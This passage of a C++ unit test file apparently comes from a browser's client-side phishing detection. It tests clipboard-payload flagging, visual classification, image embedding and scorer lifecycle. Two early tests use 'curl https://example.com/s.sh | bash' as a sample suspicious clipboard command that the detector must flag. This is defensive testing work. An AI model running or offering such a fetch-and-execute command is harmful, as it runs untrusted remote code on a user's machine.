  EXPECT_TRUE(data.is_overall_suspicious());
  EXPECT_EQ(data.content(), "curl https://example.com/s.sh | bash");
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest,
       ExcludeFullPayloadByDefault) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "false"}});

  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
  EXPECT_TRUE(data.is_overall_suspicious());
  EXPECT_FALSE(data.has_content());
}

// Tests for the browser-side visual classification pipeline shared by iOS and
// (behind kClientSideDetectionCopyFromSurface) content platforms.
class ClientSideDetectionHostBaseVisualClassificationTest
    : public ClientSideDetectionHostBaseTest {
 protected:
  void SetUp() override {
    ClientSideDetectionHostBaseTest::SetUp();
    ON_CALL(service_, IsModelAvailable()).WillByDefault(Return(true));
    ON_CALL(service_, GetTriggerModelVersion()).WillByDefault(Return(1));
    ON_CALL(service_, HasImageEmbeddingModel()).WillByDefault(Return(false));
    ON_CALL(service_, IsModelMetadataImageEmbeddingVersionMatching())
        .WillByDefault(Return(false));
    CreateHost();
  }

  void CreateHost() {
    host_ = std::make_unique<TestClientSideDetectionHostBase>(
        cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
        service_.GetWeakPtr(), /*is_off_the_record=*/false);
    host_->set_current_url(url_);
  }

  // Installs a `MockScorer` on the service and returns it. The host picks it
  // up on the next `StartVisualClassification()`.
  MockScorer* InstallMockScorer() {
    auto scorer = std::make_unique<testing::NiceMock<MockScorer>>();
    MockScorer* raw_scorer = scorer.get();
    service_.SetScorerForTesting(std::move(scorer));
    return raw_scorer;
  }

  void PrepareImageEmbeddingTest() {
    SetEnhancedProtectionPrefForTests(&prefs_, true);
    ON_CALL(service_, HasImageEmbeddingModel()).WillByDefault(Return(true));
    ON_CALL(service_, IsModelMetadataImageEmbeddingVersionMatching())
        .WillByDefault(Return(true));
  }

  static void RunVisualModelCallback(
      std::vector<double> scores,
      const gfx::Image& image,
      base::OnceCallback<void(std::vector<double>)> callback) {
    std::move(callback).Run(std::move(scores));
  }

  static void RunEmbeddingCallback(
      const gfx::Image& image,
      base::OnceCallback<void(ImageFeatureEmbedding)> callback) {
    ImageFeatureEmbedding embedding;
    embedding.add_embedding_value(0.5f);
    std::move(callback).Run(embedding);
  }

  const GURL url_{"https://example.com/"};
  testing::NiceMock<MockClientSideDetectionServiceBase> service_;
};

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       StartVisualClassificationWithoutScorerReturnsEarly) {
  base::HistogramTester histograms;
  host_->set_is_csd_running(true);

  host_->StartVisualClassification(
      url_, TRIGGER_MODELS,
      /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());

  EXPECT_THAT(
      host_->last_early_return_reason_,
      Optional(
          VisualClassificationEarlyReturnReason::kScorerMissingAfterSnapshot));
  EXPECT_FALSE(host_->is_csd_running());
  EXPECT_FALSE(host_->is_classifying());
  histograms.ExpectUniqueSample(
      "SBClientPhishing.VisualClassificationEarlyReturnReason",
      VisualClassificationEarlyReturnReason::kScorerMissingAfterSnapshot, 1);
  histograms.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel", 0);
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       StartVisualClassificationReportsVerdict) {
  MockScorer* scorer = InstallMockScorer();
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _))
      .WillOnce([](const gfx::Image& image,
                   base::OnceCallback<void(std::vector<double>)> callback) {
        RunVisualModelCallback({0.9}, image, std::move(callback));
      });
  EXPECT_CALL(*host_, ClassifyPhishingThroughThresholds(_))
      .WillOnce([](ClientPhishingRequest* verdict) {
        verdict->set_is_phishing(true);
      });
  base::HistogramTester histograms;

  host_->StartVisualClassification(
      url_, TRIGGER_MODELS,
      /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
  EXPECT_TRUE(host_->is_classifying());
  EXPECT_TRUE(host_->classifier_->is_ready());
  EXPECT_TRUE(host_->image_embedder_->is_ready());
  task_environment_.RunUntilIdle();

  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel",
      PhishingDetectorResult::CLASSIFICATION_SUCCESS, 1);
  histograms.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionEvent.TriggerModel",
      ClientSideDetectionEvent::kImageClassificationBegin, 1);
  EXPECT_FALSE(host_->is_classifying());
  // The capture is retained for image embedding on a phishy verdict.
  EXPECT_FALSE(host_->classification_image_.IsEmpty());
  // Scorers are destroyed on a background thread; verify here instead.
  Mock::VerifyAndClearExpectations(scorer);
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       BenignTriggerModelsClearsRetainedImage) {
  MockScorer* scorer = InstallMockScorer();
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _))
      .WillOnce([](const gfx::Image& image,
                   base::OnceCallback<void(std::vector<double>)> callback) {
        RunVisualModelCallback({0.1}, image, std::move(callback));
      });
  EXPECT_CALL(*host_, ClassifyPhishingThroughThresholds(_))
      .WillOnce([](ClientPhishingRequest* verdict) {
        verdict->set_is_phishing(false);
      });

  host_->StartVisualClassification(
      url_, TRIGGER_MODELS,
      /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
  task_environment_.RunUntilIdle();

  EXPECT_FALSE(host_->is_csd_running());
  // A skipped benign TRIGGER_MODELS full report must not retain the capture.
  EXPECT_TRUE(host_->classification_image_.IsEmpty());
  Mock::VerifyAndClearExpectations(scorer);
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       EnhancedProtectionUpgradesTriggerModelsToImageEmbeddingMatch) {
  base::test::ScopedFeatureList features;
  features.InitAndEnableFeature(kClientSideDetectionImageEmbeddingMatch);
  SetEnhancedProtectionPrefForTests(&prefs_, true);
  MockScorer* scorer = InstallMockScorer();
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _))
      .WillOnce([](const gfx::Image& image,
                   base::OnceCallback<void(std::vector<double>)> callback) {
        RunVisualModelCallback({0.1}, image, std::move(callback));
      });
  // IMAGE_EMBEDDING_MATCH classification embeds the image as part of scoring.
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModelImageEmbedding(_, _))
      .WillOnce(&RunEmbeddingCallback);
  base::HistogramTester histograms;

  host_->StartVisualClassification(
      url_, TRIGGER_MODELS,
      /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
  task_environment_.RunUntilIdle();

  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult.ImageEmbeddingMatch",
      PhishingDetectorResult::CLASSIFICATION_SUCCESS, 1);
  histograms.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel", 0);
  Mock::VerifyAndClearExpectations(scorer);
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       ClassificationFailureDoesNotRetainImage) {
  base::HistogramTester histograms;
  ClientPhishingRequest verdict;
  verdict.set_url(url_.spec());

  host_->OnVisualClassificationDone(
      url_, CreateTestImage(), TRIGGER_MODELS, /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, base::TimeTicks::Now(),
      verdict, PhishingClassifier::Result::kVisualExtractionFailed);

  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel",
      PhishingDetectorResult::VISUAL_EXTRACTION_FAILED, 1);
  EXPECT_TRUE(host_->classification_image_.IsEmpty());
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       BrowserSideImageEmbeddingUsesRetainedImage) {
  PrepareImageEmbeddingTest();
  MockScorer* scorer = InstallMockScorer();
  host_->image_embedder_->set_scorer(scorer);
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModelImageEmbedding(_, _))
      .WillOnce(&RunEmbeddingCallback);
  host_->classification_image_ = CreateTestImage();

  std::unique_ptr<ClientPhishingRequest> sent_verdict;
  EXPECT_CALL(service_, SendClientReportPhishingRequest(_, _, _))
      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> verdict,
                    ClientSideDetectionServiceBase::
                        ClientReportPhishingRequestCallback callback,
                    const std::string& access_token) {
        sent_verdict = std::move(verdict);
      });

  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url_.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);
  verdict->set_is_phishing(true);
  base::HistogramTester histograms;

  host_->StartBrowserSideImageEmbedding(
      std::move(verdict), /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
  // The capture is handed to the embedder and released immediately.
  EXPECT_TRUE(host_->classification_image_.IsEmpty());
  task_environment_.RunUntilIdle();

  histograms.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionEvent.TriggerModel",
      ClientSideDetectionEvent::kImageEmbeddingBegin, 1);
  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingImageEmbeddingResult.TriggerModel",
      ClientSideDetectionHostBase::ImageEmbeddingResult::kSuccess, 1);
  ASSERT_TRUE(sent_verdict);
  EXPECT_EQ(sent_verdict->image_feature_embedding().embedding_value_size(), 1);
  Mock::VerifyAndClearExpectations(scorer);
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       BrowserSideImageEmbeddingEmptyResultRecordsFailed) {
  PrepareImageEmbeddingTest();
  MockScorer* scorer = InstallMockScorer();
  host_->image_embedder_->set_scorer(scorer);
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModelImageEmbedding(_, _))
      .WillOnce([](const gfx::Image& image,
                   base::OnceCallback<void(ImageFeatureEmbedding)> callback) {
        std::move(callback).Run(ImageFeatureEmbedding());
      });
  host_->classification_image_ = CreateTestImage();

  std::unique_ptr<ClientPhishingRequest> sent_verdict;
  EXPECT_CALL(service_, SendClientReportPhishingRequest(_, _, _))
      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> verdict,
                    ClientSideDetectionServiceBase::
                        ClientReportPhishingRequestCallback callback,
                    const std::string& access_token) {
        sent_verdict = std::move(verdict);
      });

  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url_.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);
  verdict->set_is_phishing(true);
  base::HistogramTester histograms;

  host_->StartBrowserSideImageEmbedding(
      std::move(verdict), /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
  task_environment_.RunUntilIdle();

  histograms.ExpectUniqueSample(
      "SBClientPhishing.PhishingImageEmbeddingResult.TriggerModel",
      ClientSideDetectionHostBase::ImageEmbeddingResult::kFailed, 1);
  ASSERT_TRUE(sent_verdict);
  EXPECT_FALSE(sent_verdict->has_image_feature_embedding());
  EXPECT_FALSE(sent_verdict->has_visual_features());
  EXPECT_TRUE(host_->classification_image_.IsEmpty());
  Mock::VerifyAndClearExpectations(scorer);
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       BrowserSideImageEmbeddingSkippedWithoutRetainedImage) {
  PrepareImageEmbeddingTest();
  MockScorer* scorer = InstallMockScorer();
  host_->image_embedder_->set_scorer(scorer);
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModelImageEmbedding(_, _)).Times(0);
  EXPECT_CALL(service_, SendClientReportPhishingRequest(_, _, _)).Times(1);

  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url_.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);
  verdict->set_is_phishing(true);
  base::HistogramTester histograms;

  host_->StartBrowserSideImageEmbedding(
      std::move(verdict), /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
  task_environment_.RunUntilIdle();

  histograms.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionEvent.TriggerModel",
      ClientSideDetectionEvent::kImageEmbeddingBegin, 0);
  histograms.ExpectTotalCount(
      "SBClientPhishing.PhishingImageEmbeddingResult.TriggerModel", 0);
  EXPECT_TRUE(host_->classification_image_.IsEmpty());
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       VisualFeaturesImageClearedWhenExtractionNotAllowed) {
  std::vector<std::unique_ptr<ClientPhishingRequest>> sent_verdicts;
  EXPECT_CALL(service_, SendClientReportPhishingRequest(_, _, _))
      .WillRepeatedly([&](std::unique_ptr<ClientPhishingRequest> verdict,
                          ClientSideDetectionServiceBase::
                              ClientReportPhishingRequestCallback callback,
                          const std::string& access_token) {
        sent_verdicts.push_back(std::move(verdict));
      });
  auto make_verdict = [&] {
    auto verdict = std::make_unique<ClientPhishingRequest>();
    verdict->set_url(url_.spec());
    verdict->set_client_side_detection_type(TRIGGER_MODELS);
    verdict->set_is_phishing(true);
    verdict->mutable_visual_features()->mutable_image()->set_width(1);
    return verdict;
  };
  base::HistogramTester histograms;

  // Not allowed: the blurred image is stripped and no histogram is recorded.
  host_->set_can_extract_visual_features_result(
      visual_utils::CanExtractVisualFeaturesResult::kBelowMinFrame);
  host_->StartBrowserSideImageEmbedding(
      make_verdict(), /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
  task_environment_.RunUntilIdle();
  ASSERT_EQ(sent_verdicts.size(), 1u);
  EXPECT_FALSE(sent_verdicts[0]->visual_features().has_image());
  histograms.ExpectTotalCount("SBClientPhishing.HasVisualFeaturesImage2", 0);

  // Allowed: the image is kept and its presence recorded.
  host_->set_can_extract_visual_features_result(
      visual_utils::CanExtractVisualFeaturesResult::kCanExtractVisualFeatures);
  host_->StartBrowserSideImageEmbedding(
      make_verdict(), /*did_match_high_confidence_allowlist=*/false,
      /*is_invalid_ip=*/false, PhishingDetectorResult::CLASSIFICATION_SUCCESS);
  task_environment_.RunUntilIdle();
  ASSERT_EQ(sent_verdicts.size(), 2u);
  EXPECT_TRUE(sent_verdicts[1]->visual_features().has_image());
  histograms.ExpectUniqueSample("SBClientPhishing.HasVisualFeaturesImage2",
                                true, 1);
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       ScorerChangeCancelsClassificationAndDropsScorer) {
  MockScorer* scorer = InstallMockScorer();
  // Hold the classification open by never running the callback.
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _)).Times(testing::AtMost(1));
  base::HistogramTester histograms;
  host_->StartVisualClassification(
      url_, TRIGGER_MODELS,
      /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
  ASSERT_TRUE(host_->classifier_->is_ready());
  const int cancel_count = host_->cancel_pending_requests_count_;

  // Replacing the scorer must cancel the in-flight classification and drop the
  // cached raw pointers before the old scorer is destroyed.
  host_->set_is_csd_running(true);
  service_.SetScorerForTesting(
      std::make_unique<testing::NiceMock<MockScorer>>());

  EXPECT_EQ(host_->cancel_pending_requests_count_, cancel_count + 1);
  EXPECT_FALSE(host_->classifier_->is_ready());
  EXPECT_FALSE(host_->image_embedder_->is_ready());
  EXPECT_TRUE(host_->classification_image_.IsEmpty());
  // The dropped request never reports back, so CSD must not stay busy.
  EXPECT_FALSE(host_->is_classifying());
  EXPECT_FALSE(host_->is_csd_running());
  task_environment_.RunUntilIdle();
  histograms.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.TriggerModel", 0);
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       ServiceDestroyedBeforeHostIsSafe) {
  auto service =
      std::make_unique<testing::NiceMock<MockClientSideDetectionServiceBase>>();
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      service->GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url_);
  service->SetScorerForTesting(
      std::make_unique<testing::NiceMock<MockScorer>>());

  // Destroying the service clears (and notifies about) its scorer first.
  const int cancel_count = host_->cancel_pending_requests_count_;
  service.reset();
  EXPECT_EQ(host_->cancel_pending_requests_count_, cancel_count + 1);
  EXPECT_FALSE(host_->classifier_->is_ready());

  // Classification without a service is an early return, not a crash.
  base::HistogramTester histograms;
  host_->StartVisualClassification(
      url_, TRIGGER_MODELS,
      /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
  EXPECT_THAT(
      host_->last_early_return_reason_,
      Optional(
          VisualClassificationEarlyReturnReason::kScorerMissingAfterSnapshot));
  histograms.ExpectUniqueSample(
      "SBClientPhishing.VisualClassificationEarlyReturnReason",
      VisualClassificationEarlyReturnReason::kScorerMissingAfterSnapshot, 1);
  task_environment_.RunUntilIdle();
}

TEST_F(ClientSideDetectionHostBaseVisualClassificationTest,
       HostDestroyedDuringClassificationDoesNotCrash) {
  MockScorer* scorer = InstallMockScorer();
  EXPECT_CALL(*scorer, ApplyVisualTfLiteModel(_, _)).Times(testing::AtMost(1));
  host_->StartVisualClassification(
      url_, TRIGGER_MODELS,
      /*is_sample_ping=*/false,
      /*did_match_high_confidence_allowlist=*/false, CreateTestImage());
  ASSERT_TRUE(host_->is_classifying());

  // The base destructor cancels the pending classification.
  host_.reset();
  task_environment_.RunUntilIdle();
}

}  // namespace safe_browsing
